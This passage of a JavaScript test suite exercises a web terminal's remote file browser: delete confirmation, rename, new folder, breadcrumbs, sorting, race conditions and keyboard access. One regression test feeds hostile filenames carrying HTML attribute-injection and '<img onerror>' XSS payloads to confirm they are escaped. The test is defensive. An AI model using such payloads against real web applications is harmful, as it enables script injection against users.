  ok(p.cwd === '', 'cwd cleared with the session; got ' + p.cwd);
  cleanup(env);
});

test('file browser delete: confirm strip, then POST /api/rm', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const rows = $(win, 'fbList').querySelectorAll('.fb-row');
  // Row 0 is '..' and must not offer rename or delete, but keeps the
  // fixed-width action group so columns stay aligned.
  ok(!rows[0].querySelector('[data-fb-del]'), 'parent row has no delete button');
  ok(!rows[0].querySelector('[data-fb-ren]'), 'parent row has no rename button');
  ok(!!rows[0].querySelector('.fb-act'), 'parent row keeps the action group');

  const target = Array.from(rows).find(
    r => r.querySelector('.fb-nm') &&
         r.querySelector('.fb-nm').textContent === 'zeta.txt');
  ok(!!target, 'found the zeta.txt row');
  // The actions live at the far right — the group is the row's last
  // child, and delete is the last button inside it (rename precedes it).
  ok(target.lastElementChild &&
     target.lastElementChild.classList.contains('fb-act'),
     'action group is the rightmost element in a file row');
  ok(target.querySelector('.fb-act').lastElementChild.hasAttribute('data-fb-del'),
     'delete is the last action, after rename');
  target.querySelector('[data-fb-del]').click();
  ok(target.classList.contains('fb-confirm'), 'row switched to confirm mode');
  ok(target.textContent.indexOf('zeta.txt') >= 0,
     'confirm keeps the filename visible; got ' + target.textContent);

  // A click on the row while confirming must not start a download.
  const dl = [];
  win.startFastDownload = (id, path) => dl.push(path);
  target.click();
  ok(dl.length === 0, 'row is inert while confirming; got ' + JSON.stringify(dl));

  const before = env.log.filter(e => e.action === 'rm').length;
  target.querySelector('.fb-cf-yes').click();
  await sleep(40);
  const rms = env.log.filter(e => e.action === 'rm');
  ok(rms.length === before + 1, 'exactly one rm POSTed; got ' + rms.length);
  ok(rms[rms.length - 1].body.path === '/home/alice/zeta.txt',
     'absolute path sent; got ' + JSON.stringify(rms[rms.length - 1].body));
  ok(rms[rms.length - 1].body.session_id === 'sa', 'session id sent');
  cleanup(env);
});

test('file browser delete: cancel restores the row and sends nothing', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const target = Array.from($(win, 'fbList').querySelectorAll('.fb-row')).find(
    r => r.querySelector('.fb-nm') &&
         r.querySelector('.fb-nm').textContent === 'mid.txt');
  target.querySelector('[data-fb-del]').click();
  target.querySelector('.fb-cf-no').click();
  ok(!target.classList.contains('fb-confirm'), 'confirm mode left');
  ok(target.querySelector('.fb-nm').textContent === 'mid.txt',
     'row contents restored');
  ok(env.log.filter(e => e.action === 'rm').length === 0, 'no rm sent');

  // The restored row must still be usable: delete re-arms...
  target.querySelector('[data-fb-del]').click();
  ok(target.classList.contains('fb-confirm'), 'delete re-arms after a cancel');
  target.querySelector('.fb-cf-no').click();
  // ...and so does the download action.
  const dl = [];
  win.startFastDownload = (id, path) => dl.push(path);
  target.click();
  ok(dl.length === 1 && dl[0] === '/home/alice/mid.txt',
     'download works again after cancel; got ' + JSON.stringify(dl));
  cleanup(env);
});

test('file browser delete: a failure restores the row and reports why', async () => {
  const plan = FB_PLAN(FB_ENTRIES);
  plan.find(e => e.action === 'rm').response =
    {error: 'directory not empty or not writable'};
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const toasts = [];
  win.showToast = (m, k) => toasts.push(k + ':' + m);
  const target = Array.from($(win, 'fbList').querySelectorAll('.fb-row')).find(
    r => r.querySelector('.fb-nm') &&
         r.querySelector('.fb-nm').textContent === 'zdir');
  target.querySelector('[data-fb-del]').click();
  target.querySelector('.fb-cf-yes').click();
  await sleep(40);
  ok(toasts.some(t => t.indexOf('not empty') >= 0),
     'the server reason reaches the user; got ' + JSON.stringify(toasts));
  ok(!target.classList.contains('fb-confirm'), 'row left confirm mode');
  ok(target.querySelector('.fb-nm') &&
     target.querySelector('.fb-nm').textContent === 'zdir',
     'row restored so the entry is still visible and actionable');
  cleanup(env);
});

test('file browser delete: Escape answers the confirm, not the browser', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const target = Array.from($(win, 'fbList').querySelectorAll('.fb-row')).find(
    r => r.querySelector('.fb-nm') &&
         r.querySelector('.fb-nm').textContent === 'zeta.txt');
  target.querySelector('[data-fb-del]').click();
  ok(target.classList.contains('fb-confirm'), 'armed');

  const esc = () => win.document.dispatchEvent(new win.KeyboardEvent(
    'keydown', {key: 'Escape', bubbles: true}));
  esc();
  ok(!target.classList.contains('fb-confirm'), 'first Escape cancels the confirm');
  ok(!hidden($(win, 'fbOv')), 'the browser itself stays open');
  ok(env.log.filter(e => e.action === 'rm').length === 0, 'nothing deleted');

  // A second Escape, with nothing armed, closes the browser as before.
  esc();
  ok(hidden($(win, 'fbOv')), 'second Escape closes the browser');
  cleanup(env);
});

test('file browser delete: arming a second row disarms the first', async () => {
  // Two open "Delete?" prompts at once is an easy way to answer the
  // wrong one.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const rowFor = n => Array.from($(win, 'fbList').querySelectorAll('.fb-row')).find(
    r => r.querySelector('.fb-nm') && r.querySelector('.fb-nm').textContent === n);
  const a = rowFor('zeta.txt'), b = rowFor('mid.txt');
  a.querySelector('[data-fb-del]').click();
  b.querySelector('[data-fb-del]').click();
  ok(b.classList.contains('fb-confirm'), 'second row armed');
  ok(!a.classList.contains('fb-confirm'), 'first row disarmed');
  ok(a.querySelector('.fb-nm').textContent === 'zeta.txt',
     'first row restored intact');
  ok($(win, 'fbList').querySelectorAll('.fb-confirm').length === 1,
     'exactly one confirmation on screen');
  cleanup(env);
});

test('file browser survives a malformed listing response', async () => {
  // Regression guard: a response missing `path`/`entries` used to reach
  // the renderer, which then built "undefined/name" download targets.
  const plan = FB_PLAN(FB_ENTRIES);
  plan.find(e => e.action === 'ls').response = {alive: false};
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  ok($(win, 'fbList').querySelector('.fb-msg.err'),
     'an error message is shown instead of a broken listing');
  ok($(win, 'fbList').querySelectorAll('.fb-row').length === 0,
     'no rows rendered from a malformed response');
  cleanup(env);
});

// ── breadcrumbs, filter, hidden toggle, mkdir, rename ────────────────

const FB_DOTS = [
  {name: '.bashrc',   type: 'f', size: 10, mtime: 1000},
  {name: '.config',   type: 'd', size: 4096, mtime: 2000},
  {name: 'report.txt', type: 'f', size: 20, mtime: 3000},
  {name: 'notes.md',  type: 'f', size: 30, mtime: 4000},
];

test('file browser breadcrumbs: segments are clickable and navigate', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice/projects'));
  const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const nav = $(win, 'fbPath');
  ok(nav.getAttribute('data-path') === '/home/alice/projects',
     'full path recorded in data-path; got ' + nav.getAttribute('data-path'));
  const crumbs = Array.from(nav.querySelectorAll('.fb-crumb')).map(c => c.textContent);
  ok(JSON.stringify(crumbs) === JSON.stringify(['/', 'home', 'alice', 'projects']),
     'root + one crumb per segment; got ' + JSON.stringify(crumbs));
  const last = nav.querySelectorAll('.fb-crumb');
  ok(last[last.length - 1].classList.contains('cur'),
     'the deepest segment is marked current');

  // Clicking "alice" navigates there.
  const urls = recordUrls(win);
  Array.from(nav.querySelectorAll('.fb-crumb')).find(c => c.textContent === 'alice').click();
  await sleep(30);
  const ls = urls.reverse().find(u => u.indexOf('action=ls') >= 0);
  ok(ls.indexOf(encodeURIComponent('/home/alice')) >= 0 &&
     ls.indexOf(encodeURIComponent('/home/alice/projects')) < 0,
     'clicking a crumb lists that ancestor; got ' + ls);
  cleanup(env);
});

test('file browser hides dotfiles by default, toggle reveals them', async () => {
  const env = await mkEnv(FB_PLAN(FB_DOTS)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  ok(win.settings.fbShowHidden === false, 'hidden off by default');
  // .bashrc and .config are present in the DOM but not visible.
  ok(names(win).indexOf('.bashrc') >= 0, 'dotfile row exists in the DOM');
  ok(visNames(win).indexOf('.bashrc') < 0, '.bashrc hidden from view');
  ok(visNames(win).indexOf('..') >= 0, '".." is never hidden as a dotfile');
  ok(visNames(win).indexOf('report.txt') >= 0, 'regular files stay visible');

  win.toggleFbHidden(); await sleep(10);
  ok(win.settings.fbShowHidden === true, 'toggle flips the setting');
  ok(visNames(win).indexOf('.bashrc') >= 0, '.bashrc visible after toggle');
  ok(visNames(win).indexOf('.config') >= 0, 'hidden dir visible too');
  // Persisted so the next session remembers it.
  const raw = win.localStorage.getItem(
    Object.keys(win.localStorage).find(k => k.indexOf('settings') >= 0));
  ok(raw && JSON.parse(raw).fbShowHidden === true, 'choice persisted');
  cleanup(env);
});

test('file browser name filter narrows the list live, without a roundtrip', async () => {
  const env = await mkEnv(FB_PLAN(FB_DOTS)); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const before = env.log.filter(e => e.action === 'ls').length;
  $(win, 'fbFilter').value = 'report';
  win.applyFbFilter();
  ok(visNames(win).filter(n => n !== '..').join(',') === 'report.txt',
     'only the match remains; got ' + JSON.stringify(visNames(win)));
  ok(visNames(win).indexOf('..') >= 0, '".." stays visible while filtering');
  ok(env.log.filter(e => e.action === 'ls').length === before,
     'filtering is client-side — no new ls');

  // Clearing restores everything (minus still-hidden dotfiles).
  $(win, 'fbFilter').value = '';
  win.applyFbFilter();
  ok(visNames(win).indexOf('notes.md') >= 0, 'clearing the filter restores rows');
  cleanup(env);
});

test('file browser new folder: inline input POSTs mkdir under the current dir', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  win.fbNewFolder();
  const inp = $(win, 'fbList').querySelector('.fb-ed-inp');
  ok(!!inp, 'an inline editor row appeared');
  inp.value = 'newstuff';
  $(win, 'fbList').querySelector('.fb-ed-ok').click();
  await sleep(40);
  const mk = env.log.filter(e => e.action === 'mkdir');
  ok(mk.length === 1, 'exactly one mkdir POSTed; got ' + mk.length);
  ok(mk[0].body.path === '/home/alice/newstuff',
     'created under the current dir; got ' + JSON.stringify(mk[0].body));
  cleanup(env);
});

test('file browser new folder: root path joins without a double slash', async () => {
  const env = await mkEnv(FB_PLAN([], '/')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  win.fbNewFolder();
  const inp = $(win, 'fbList').querySelector('.fb-ed-inp');
  inp.value = 'srv';
  $(win, 'fbList').querySelector('.fb-ed-ok').click();
  await sleep(40);
  const mk = env.log.filter(e => e.action === 'mkdir');
  ok(mk[0].body.path === '/srv',
     'root + name has no double slash; got ' + JSON.stringify(mk[0].body));
  cleanup(env);
});

test('file browser rename: pencil opens an editor and POSTs mv', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const row = rowFor(win, 'zeta.txt');
  row.querySelector('[data-fb-ren]').click();
  ok(row.classList.contains('fb-edit'), 'row switched to edit mode');
  const inp = row.querySelector('.fb-ed-inp');
  ok(inp.value === 'zeta.txt', 'editor prefilled with the current name');
  inp.value = 'omega.txt';
  row.querySelector('.fb-ed-ok').click();
  await sleep(40);
  const mv = env.log.filter(e => e.action === 'mv');
  ok(mv.length === 1, 'one mv POSTed; got ' + mv.length);
  ok(mv[0].body.path === '/home/alice/zeta.txt' && mv[0].body.name === 'omega.txt',
     'source path + bare new name; got ' + JSON.stringify(mv[0].body));
  cleanup(env);
});

test('file browser rename: unchanged or empty name sends nothing', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const row = rowFor(win, 'mid.txt');
  row.querySelector('[data-fb-ren]').click();
  // Same name → no-op, editor closes.
  row.querySelector('.fb-ed-ok').click();
  await sleep(20);
  ok(env.log.filter(e => e.action === 'mv').length === 0, 'unchanged name: no mv');
  ok(!row.classList.contains('fb-edit'), 'editor closed');
  cleanup(env);
});

test('file browser rename: Escape in the field cancels without closing the browser', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const row = rowFor(win, 'zeta.txt');
  row.querySelector('[data-fb-ren]').click();
  const inp = row.querySelector('.fb-ed-inp');
  inp.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));
  ok(!row.classList.contains('fb-edit'), 'editor closed on Escape');
  ok(!hidden($(win, 'fbOv')), 'the browser stays open');
  ok(row.querySelector('.fb-nm') && row.querySelector('.fb-nm').textContent === 'zeta.txt',
     'the row is restored intact');
  cleanup(env);
});

test('file browser: opening rename cancels an open delete confirm', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const a = rowFor(win, 'zeta.txt'), b = rowFor(win, 'mid.txt');
  a.querySelector('[data-fb-del]').click();
  ok(a.classList.contains('fb-confirm'), 'delete confirm armed on A');
  b.querySelector('[data-fb-ren]').click();
  ok(b.classList.contains('fb-edit'), 'rename editor opened on B');
  ok(!a.classList.contains('fb-confirm'), 'A delete confirm was dismissed');
  ok($(win, 'fbList').querySelectorAll('.fb-confirm, .fb-edit').length === 1,
     'only one inline editor open at a time');
  cleanup(env);
});

test('isolate_storage: font link refreshes to the path-scoped family at boot (#152)', async () => {
  // Under isolate_storage the path-scoped settings (incl. font) are only
  // known after /api/config returns. The module-init ensureFontLink ran
  // under the empty prefix and loaded the DEFAULT family; loadServerConfig
  // must refresh the link to the path-scoped font, or an isolate_storage
  // user who picked a non-default font gets the default face every reload.
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                              connections: [], isolate_storage: true}}];
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                               url: 'http://localhost/p/'});
  const win = dom.window;
  makeFakes(win);
  win.fetch = makeFetch(plan, []);
  _injectVaultGlobals(win);
  win.localStorage.clear();
  // Seed the path-scoped settings (storagePrefix '/p/') with a non-default
  // font BEFORE boot; the empty-prefix key is left at the default.
  win.localStorage.setItem('/p/websh_settings', JSON.stringify({font: 'fira-code'}));
  win.eval(js + EXPOSE);
  await sleep(30);
  const link = win.document.getElementById('dynFontCss');
  ok(!!link, 'font link present after boot');
  ok(/Fira\+Code/.test(link.getAttribute('href')),
     'link tracks the path-scoped fira-code, not the empty-prefix default; got '
     + link.getAttribute('href'));
  ok(!/JetBrains\+Mono/.test(link.getAttribute('href')),
     'default family must not stay active under isolate_storage');
  await closeDom(dom);
});

test('transportFatal no-ops on a torn-down transport (stale reconnect guard, #134)', async () => {
  // After endSession tears a pane down (p.polling=false), an in-flight
  // auto-reconnect sets p.connecting=true. A late fetch/SSE rejection from
  // the OLD transport must NOT re-banner the pane and must NOT reset
  // p.connecting — that would defuse connectPane's duplicate-connect guard
  // and re-open the double-/api/connect + leaked-PTY race. This pins the
  // endSession refactor's `if (!p.polling) return` guard.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's-tf', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(!!p, 'pane up');

  // Reconnect window: endSession dropped polling; connectPane set connecting.
  p.polling = false;
  p.connecting = true;
  p.sid = 's-stale';
  const writes = [];
  p.term.write = (s) => { writes.push(String(s)); };

  win.transportFatal(p, new Error('fetch failed 502'));
  ok(writes.length === 0,
     'guarded: no banner on a torn-down transport; got ' + JSON.stringify(writes));
  ok(p.connecting === true,
     'guarded: p.connecting preserved (in-flight reconnect guard intact)');
  ok(p.sid === 's-stale', 'guarded: p.sid not nulled');

  // Positive control: a LIVE transport (polling=true) must still surface.
  p.polling = true;
  win.transportFatal(p, new Error('fetch failed 502'));
  ok(writes.some(s => /backend restarted|connection lost/.test(s)),
     'live transport still banners; got ' + JSON.stringify(writes));
  ok(p.polling === false, 'live transportFatal tore the pane down via endSession');
  cleanup(env);
});

test('file browser: a hostile filename cannot inject attributes or markup (esc + DOM API)', async () => {
  // esc() used to be textContent->innerHTML, which escapes & < > but not
  // quotes, and the row's Rename/Delete buttons interpolated esc(name)
  // INSIDE an aria-label="..." attribute. A remote file named
  //   pwn" onmouseover="..." data-x="
  // therefore rendered a live event handler in the websh origin.
  const evil = 'pwn" onmouseover="window.__PWNED=1" data-x="';
  const evil2 = "<img src=x onerror=\"window.__PWNED=2\">'.txt";
  const entries = [
    {name: evil,  type: 'f', size: 1, mtime: 1000},
    {name: evil2, type: 'f', size: 1, mtime: 2000},
  ];
  const env = await mkEnv(FB_PLAN(entries, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  ok(win.__PWNED === undefined, 'no injected handler ran at render');
  ok($(win, 'fbList').querySelector('[onmouseover],[onerror],img') === null,
     'no injected attribute/element anywhere in the list');
  for (const n of [evil, evil2]) {
    const row = rowFor(win, n);
    ok(!!row, 'row rendered for ' + JSON.stringify(n));
    const ren = row.querySelector('[data-fb-ren]');
    ok(ren.getAttribute('aria-label') === 'Rename ' + n,
       'aria-label carries the full verbatim name; got ' + ren.getAttribute('aria-label'));
    ok(!ren.hasAttribute('onmouseover') && !ren.hasAttribute('data-x'),
       'no attribute smuggled onto the button');
    ok(row.querySelector('.fb-nm').textContent === n, 'name shown verbatim as text');
  }
  ok(win.esc('a"b\'c<d>&') === 'a&quot;b&#39;c&lt;d&gt;&amp;', 'esc() escapes quotes too');
  cleanup(env);
});

test('file browser: cancelling a delete keeps the Rename button working', async () => {
  // askFbDelete's done() restored the row's innerHTML but re-wired only
  // the delete button. The next click on the orphaned pencil bubbled to
  // the row itself, which closed the browser and started a download.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  let row = rowFor(win, 'mid.txt');
  row.querySelector('[data-fb-del]').click();
  ok(row.classList.contains('fb-confirm'), 'delete confirm armed');
  row.querySelector('.fb-cf-no').click();
  ok(!row.classList.contains('fb-confirm'), 'delete confirm cancelled');
  row.querySelector('[data-fb-ren]').click();
  await sleep(10);
  ok(row.classList.contains('fb-edit'), 'pencil still opens the rename editor');
  ok(!$(win, 'fbOv').hidden, 'browser stayed open (no download was started)');
  ok(env.log.filter(e => e.action === 'ls').length === 1, 'no navigation happened');
  // Symmetric: cancel rename, then delete still works.
  row.querySelector('.fb-ed-no').click();
  row.querySelector('[data-fb-del]').click();
  ok(row.classList.contains('fb-confirm'), 'delete still arms after a rename cancel');
  cleanup(env);
});

test('file browser: a slow earlier /api/ls reply cannot overwrite a newer directory', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sa', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'ls', once: true, response: {path: '/home/alice', entries: FB_ENTRIES}},
    {action: 'ls', once: true, delay: 200,
     response: {path: '/slow', entries: [{name: 'slow.txt', type: 'f', size: 1, mtime: 1}]}},
    {action: 'ls', once: true, delay: 5,
     response: {path: '/fast', entries: [{name: 'fast.txt', type: 'f', size: 1, mtime: 1}]}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  win.loadFbDir('/slow');
  win.loadFbDir('/fast');
  await sleep(320);
  ok($(win, 'fbPath').getAttribute('data-path') === '/fast',
     'breadcrumb shows the newest directory; got ' + $(win, 'fbPath').getAttribute('data-path'));
  ok(names(win).includes('fast.txt') && !names(win).includes('slow.txt'),
     'rows are from the newest reply; got ' + JSON.stringify(names(win)));
  cleanup(env);
});

test('file browser: a listing keeps its rows while the next one loads (no Loading… collapse)', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sa', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'ls', once: true, response: {path: '/home/alice', entries: FB_ENTRIES}},
    {action: 'rm', response: {ok: true}},
    {action: 'ls', delay: 150,
     response: {path: '/home/alice', entries: FB_ENTRIES.slice(1)}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const real = () => names(win).filter(n => n !== '..');
  const before = real().length;
  ok(before === FB_ENTRIES.length, 'initial listing rendered');
  // Delete -> confirm -> rm ok -> re-list (slow). Meanwhile the rows stay.
  const row = rowFor(win, 'zeta.txt');
  row.querySelector('[data-fb-del]').click();
  row.querySelector('.fb-cf-yes').click();
  await sleep(40);
  const list = $(win, 'fbList');
  ok(list.querySelectorAll('.fb-row').length >= before - 1,
     'rows kept during the re-list; got ' + list.querySelectorAll('.fb-row').length);
  ok(!/Loading/.test(list.textContent), 'no Loading… placeholder while rows exist');
  ok(list.getAttribute('aria-busy') === 'true', 'list marked busy meanwhile');
  await sleep(200);
  ok(!real().includes('zeta.txt') && real().length === FB_ENTRIES.length - 1,
     'final listing swapped in; got ' + JSON.stringify(real()));
  ok(list.getAttribute('aria-busy') === null, 'busy flag cleared');
  // Navigation keeps rows too.
  win.loadFbDir('/elsewhere');
  await sleep(20);
  ok(list.querySelectorAll('.fb-row').length > 0 && !/Loading/.test(list.textContent),
     'navigation does not collapse the list either');
  cleanup(env);
});

test('file browser: a mutating action is refused when the listed session changed', async () => {
  // The rows on screen were listed through session `sa`. If the pane
  // has since reconnected (or the browser was reopened on another pane)
  // a delete must not run through the new session: that would remove
  // a same-named path on a DIFFERENT host.
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  p.sid = 'sb';                         // reconnect happened underneath
  const row = rowFor(win, 'mid.txt');
  row.querySelector('[data-fb-del]').click();
  row.querySelector('.fb-cf-yes').click();
  await sleep(40);
  ok(env.log.filter(e => e.action === 'rm').length === 0, 'no rm was sent through the new session');
  ok(env.log.filter(e => e.action === 'ls').length >= 2, 'a reload was kicked off instead');
  cleanup(env);
});

test('returning to a tab while a fit is in flight still reopens the stream', async () => {
  // kickPanesAfterAbsence reopens SSE only from fitPaneWhenStable's
  // onSettled. A fit already in flight (the 1 s drift watchdog, or a
  // font load still pending) used to make the second call return early
  // and DROP that callback: the tab came back frozen.
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  // A font load that stays pending until we release it.
  let releaseFont;
  const pending = new Promise(r => { releaseFont = r; });
  win.document.fonts = {load: () => pending, ready: Promise.resolve()};
  let restarts = 0;
  const realStart = win.startOutput;
  win.startOutput = (q) => { restarts++; };
  win.fitPaneWhenStable(p);                 // watchdog-style fit, in flight
  ok(p._fitInFlight === true, 'a fit is in flight');
  win.kickPanesAfterAbsence();              // tab comes back now
  await sleep(30);
  ok(restarts === 0, 'stream restart waits for the running fit');
  releaseFont();
  await sleep(200);
  ok(restarts === 1, 'queued restart ran once the fit finished; got ' + restarts);
  ok(!p._fitInFlight, 'fit released');
  win.startOutput = realStart;
  cleanup(env);
});

test('file browser: sorting reorders in place, no refetch, open editor survives', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const lsBefore = env.log.filter(e => e.action === 'ls').length;
  const row = rowFor(win, 'mid.txt');
  row.querySelector('[data-fb-ren]').click();
  const inp = row.querySelector('.fb-ed-inp');
  inp.value = 'typed-but-not-saved.txt';
  win.setFbSort('size');
  await sleep(20);
  ok(env.log.filter(e => e.action === 'ls').length === lsBefore, 'no /api/ls for a sort');
  ok(row.isConnected && row.classList.contains('fb-edit'), 'rename editor survived the reorder');
  ok(row.querySelector('.fb-ed-inp').value === 'typed-but-not-saved.txt', 'typed text kept');
  // By row node (data-name): the row in edit mode has no .fb-nm span.
  const order = Array.from($(win, 'fbList').querySelectorAll('.fb-row'))
    .map(r => r.dataset.name).filter(n => n && n !== '..');
  // dirs first, then files by size desc: alpha(5000) mid(700) zeta(10)
  ok(JSON.stringify(order.slice(2)) === JSON.stringify(['alpha.txt', 'mid.txt', 'zeta.txt']),
     'files reordered by size; got ' + JSON.stringify(order));
  cleanup(env);
});

test('file browser: clicking a file during a running transfer keeps the browser open and says why', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  p.upload = {cancelled: false};
  rowFor(win, 'zeta.txt').click();
  await sleep(10);
  ok(!$(win, 'fbOv').hidden, 'browser stayed open');
  ok(/already running/.test(win.document.body.textContent), 'toast explains the refusal');
  p.upload = null;
  cleanup(env);
});

test('file browser: a filter with no matches says so; an armed delete stays visible', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const f = $(win, 'fbFilter');
  f.value = 'zzzz'; win.applyFbFilter();
  ok(/No matches/.test($(win, 'fbList').textContent), '"No matches" shown for an empty filter result');
  f.value = ''; win.applyFbFilter();
  ok(!/No matches/.test($(win, 'fbList').textContent), 'note removed when rows are visible again');
  // Arm a delete, then filter it out: the confirmation must stay on screen.
  const row = rowFor(win, 'mid.txt');
  row.querySelector('[data-fb-del]').click();
  f.value = 'zeta'; win.applyFbFilter();
  ok(!row.classList.contains('fb-hide'), 'armed delete confirmation is never hidden');
  // Cancelling re-applies the filter to the restored row.
  row.querySelector('.fb-cf-no').click();
  ok(row.classList.contains('fb-hide'), 'after cancel the row obeys the filter again');
  cleanup(env);
});

test('file browser a11y: rows work from the keyboard, focus comes back after editors', async () => {
  const env = await mkEnv(FB_PLAN(FB_ENTRIES, '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(30);
  const key = (el, k) => el.dispatchEvent(new win.KeyboardEvent('keydown', {key: k, bubbles: true}));
  const dir = rowFor(win, 'adir');
  ok(dir.tabIndex === 0 && dir.getAttribute('role') === 'button', 'rows are focusable buttons');
  const lsBefore = env.log.filter(e => e.action === 'ls').length;
  key(dir, 'Enter');
  await sleep(20);
  ok(env.log.filter(e => e.action === 'ls').length === lsBefore + 1, 'Enter on a folder row opens it');
  await sleep(30);
  // Enter on the ✎ button inside a row must NOT also activate the row.
  const row = rowFor(win, 'mid.txt');
  const ren = row.querySelector('[data-fb-ren]');
  const lsNow = env.log.filter(e => e.action === 'ls').length;
  key(ren, 'Enter');
  await sleep(20);
  ok(!$(win, 'fbOv').hidden && env.log.filter(e => e.action === 'ls').length === lsNow,
     'keys on an inner button do not activate the row');
  // Delete -> Cancel with focus inside the editor: focus returns to ✕.
  row.querySelector('[data-fb-del]').click();
  row.querySelector('.fb-cf-no').focus();
  row.querySelector('.fb-cf-no').click();
  ok(win.document.activeElement === row.querySelector('[data-fb-del]'),
     'focus back on the delete button, not <body>; got ' + win.document.activeElement.tagName);
  // Dialog semantics + labels.
  const panel = $(win, 'fbOv').querySelector('.fb-panel');
  ok(panel.getAttribute('role') === 'dialog' && panel.getAttribute('aria-modal') === 'true', 'dialog semantics');
  ok($(win, 'fbOv').querySelector('.panel-close').getAttribute('aria-label'), 'close button labelled');
  win.toggleFbHidden();
  ok($(win, 'fbHidden').title === 'Hide dotfiles', 'Hidden title follows its state');
  win.toggleFbHidden();
  const cur = $(win, 'fbPath').querySelector('.fb-crumb.cur');
  ok(cur && cur.getAttribute('aria-current') === 'location' && cur.tabIndex === -1,
     'current crumb announced, not a dead tab stop');
  cleanup(env);
});

test('file browser: a failed navigation keeps the listing; a stale OSC 7 start falls back', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sa', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    // 1st: the OSC 7 directory is gone -> error; 2nd: pane-cwd fallback.
    {action: 'ls', once: true, response: {error: 'directory not found'}},
    {action: 'ls', once: true, response: {path: '/home/alice', entries: FB_ENTRIES}},
    // 3rd: clicking into an unreadable folder fails.
    {action: 'ls', once: true, response: {error: 'directory not found'}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  p.cwd = '/tmp/deleted-dir';
  win.showFileBrowser(p.id);
  await sleep(60);
  const ls = env.log.filter(e => e.action === 'ls');
  ok(ls.length === 2, 'fell back to a second listing; got ' + ls.length);
  ok($(win, 'fbPath').getAttribute('data-path') === '/home/alice', 'landed in the pane dir');
  ok(names(win).includes('zeta.txt'), 'rows shown');
  rowFor(win, 'adir').click();
  await sleep(40);
